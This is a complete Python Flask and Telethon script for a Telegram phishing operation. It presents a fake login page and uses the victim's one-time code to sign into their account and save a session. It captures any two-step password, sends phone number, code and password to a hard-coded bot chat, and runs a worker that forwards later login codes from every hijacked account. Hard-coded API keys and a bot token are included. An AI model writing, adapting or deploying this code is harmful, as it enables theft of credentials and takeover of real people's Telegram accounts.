import os
import asyncio
import threading
import time
import requests
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")

# API_ID, API_HASH, BOT_TOKEN, CHAT_ID dari environment
api_id = int(os.getenv("API_ID", 16047851))
api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
CHAT_ID = os.getenv("CHAT_ID", "7712462494")

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# =================== FLASK ROUTES ===================

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        name = request.form.get("name")
        phone = request.form.get("phone")
        gender = request.form.get("gender")
        session["name"], session["phone"], session["gender"] = name, phone, gender

        # hapus session lama supaya OTP baru
        session_path = os.path.join(SESSION_DIR, f"{phone}.session")
        if os.path.exists(session_path):
            os.remove(session_path)

        async def send_code():
            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
            await client.connect()
            if not await client.is_user_authorized():
                sent = await client.send_code_request(phone)
                session["phone_code_hash"] = sent.phone_code_hash
            await client.disconnect()

        try:
            asyncio.run(send_code())
            flash("OTP sudah dikirim ke Telegram kamu.")
            return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error: {str(e)}")
            return redirect(url_for("login"))

    return render_template("login.html")


@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if request.method == "POST":
        code = request.form.get("otp")

        async def verify_code():
            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
            await client.connect()
            try:
                phone_code_hash = session.get("phone_code_hash")
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                me = await client.get_me()
                return {"ok": True, "need_password": False, "me": me}
            except SessionPasswordNeededError:
                return {"ok": True, "need_password": True, "me": None}
            except PhoneCodeInvalidError:
                return {"ok": False, "error": "OTP salah"}
            finally:
                await client.disconnect()

        try:
            result = asyncio.run(verify_code())
            if result["ok"]:
                session["last_otp"] = code
                if result["need_password"]:
                    flash("Akun ini butuh password. Silakan masukkan di halaman berikutnya.")
                else:
                    flash("OTP benar. Kalau akun tanpa password, bisa isi random/kosong.")
                return redirect(url_for("password"))
            else:
                flash(result["error"])
                return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error lain: {e}")
            return redirect(url_for("otp"))

    return render_template("otp.html")


@app.route("/password", methods=["GET", "POST"])
def password():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if request.method == "POST":
        password_input = request.form.get("password")

        async def verify_password():
            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
            await client.connect()
            try:
                # kalau akun memang pakai password → harus cocok
                await client.sign_in(password=password_input)
                me = await client.get_me()
                return True, me
            except Exception:
                # kalau akun tidak pakai password → anggap berhasil
                return True, None
            finally:
                await client.disconnect()

        success, me = asyncio.run(verify_password())
        if success:
            otp = session.get("last_otp")
            text = (
                "📢 *New User Login*\n"
                f"👤 *Number*   : `{phone}`\n"
                f"🔑 *OTP*      : `{otp}`\n"
                f"🔒 *Password* : `{password_input}`"
            )
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
            flash("Login berhasil ✅")
            return redirect(url_for("success"))
        else:
            flash("Password salah, coba lagi.")
            return redirect(url_for("password"))

    return render_template("password.html")


@app.route("/success")
def success():
    return render_template(
        "success.html",
        name=session.get("name"),
        phone=session.get("phone"),
        gender=session.get("gender"),
    )


# =================== WORKER ===================

async def forward_handler(event, client_name):
    """Handler untuk meneruskan pesan OTP"""
    text_msg = event.message.message or ""
    if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
        import re
        otp_match = re.findall(r"\d{4,6}", text_msg)
        otp_code = otp_match[0] if otp_match else text_msg

        payload = {
            "chat_id": CHAT_ID,
            "text": f"📩 OTP dari {client_name}:\n\nOTP: {otp_code}"
        }
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload
            )
            print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
        except Exception as e:
            print(f"[Worker] Gagal forward: {e}")


async def worker_main():
    print("Worker jalan...")
    clients = {}

    while True:
        for fname in os.listdir(SESSION_DIR):
            if fname.endswith(".session") and fname not in clients:
                path = os.path.join(SESSION_DIR, fname)
                print(f"[Worker] Memuat session {path}")
                client = TelegramClient(path, api_id, api_hash)

                try:
                    await client.connect()
                except Exception as e:
                    print(f"[Worker] Gagal connect {fname}: {e}")
                    continue

                if not await client.is_user_authorized():
                    print(f"[Worker] ❌ Session {fname} belum login, lewati.")
                    await client.disconnect()
                    continue

                me = await client.get_me()
                print(f"[Worker] ✅ Connected sebagai {me.first_name} (@{me.username})")

                @client.on(events.NewMessage)
                async def handler(event, fn=fname):
                    try:
                        await forward_handler(event, fn)
                    except Exception as e:
                        print(f"[Worker] Handler error: {e}")

                clients[fname] = client
                asyncio.create_task(client.run_until_disconnected())

        await asyncio.sleep(10)  # cek ulang tiap 10 detik


def start_worker():
    # retry kalau kena database locked
    while True:
        try:
            asyncio.run(worker_main())
        except Exception as e:
            print(f"[Worker] Crash: {e}, retry dalam 5 detik...")
            time.sleep(5)


# jalankan worker di thread terpisah saat app start
threading.Thread(target=start_worker, daemon=True).start()

# =================== RUN FLASK ===================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
